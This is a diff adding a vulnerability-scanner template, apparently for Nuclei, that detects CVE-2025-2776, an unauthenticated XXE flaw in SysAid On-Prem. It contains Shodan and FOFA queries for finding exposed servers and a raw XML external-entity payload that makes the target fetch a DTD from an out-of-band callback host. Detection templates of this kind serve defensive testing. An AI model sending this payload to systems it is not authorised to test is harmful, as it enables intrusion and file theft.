@@ -1,0 +1,54 @@
+id: CVE-2025-2776
+
+info:
+  name: "SysAid On-Prem = 23.3.40 XML 外部实体注入漏洞"
+  author: johnk3r
+  severity: critical
+  description: |
+    SysAid On-Prem versions <= 23.3.40 are vulnerable to an unauthenticated XML External Entity (XXE) vulnerability in the Server URL processing functionality, allowing for administrator account takeover and file read primitives.
+  reference:
+    - https://labs.watchtowr.com/sysowned-your-friendly-rce-support-ticket/
+    - https://documentation.sysaid.com/docs/24-40-60
+  classification:
+    epss-score: 0.71172
+    epss-percentile: 0.9876
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L
+    cvss-score: 9.3
+    cve-id: CVE-2025-2776
+    cwe-id: CWE-611
+  metadata:
+    max-request: 1
+    vendor: sysaid
+    product: sysaid
+    shodan-query: http.favicon.hash:"1540720428"
+    fofa-query: icon_hash=1540720428
+  tags: sysaid
+
+variables:
+  filename: "{{to_lower(rand_text_alpha(5))}}"
+
+http:
+  - raw:
+      - |
+        POST /mdm/serverurl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" ?>
+        <!DOCTYPE foo [
+        <!ENTITY % foo SYSTEM "http://{{interactsh-url}}/{{filename}}.dtd">
+        %foo;
+        ]>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "User-Agent: Java"
+# digest: 4b0a0048304602210085f63d1b47d446b70c815ae9967117fe5f9e3734845cd596ad831b04f26a162c022100e90f3f859f606838b4fc8aed56fcfad83321ee023429a85bb1e4068d2290ac0c:922c64590222798bb761d5b6d8e72950
